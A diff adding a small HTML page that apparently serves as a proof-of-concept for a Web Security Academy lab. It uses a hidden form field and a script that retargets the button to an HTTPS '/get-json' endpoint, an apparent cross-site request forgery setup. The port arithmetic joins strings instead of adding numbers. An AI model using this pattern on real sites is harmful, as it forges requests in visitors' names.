@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>My webpage!</title>
+  </head>
+  <body>
+    <form method="GET" action="/get-json">
+      <input
+        type="hidden"
+        name="email"
+        value="anything%40web-security-academy.net"
+      />
+      <button id="getjsonform">SSL Login</button>
+    </form>
+    <script>
+      // send login to parent on HTTPS
+      var SSLloginURL =
+        "https://" +
+        document.location.hostname +
+        ":" +
+        (document.location.port + 300).toString() +
+        "/get-json";
+      var parentframe = document.getElementById("getjsonform");
+      parentframe.formAction = SSLloginURL;
+    </script>
+  </body>
+</html>
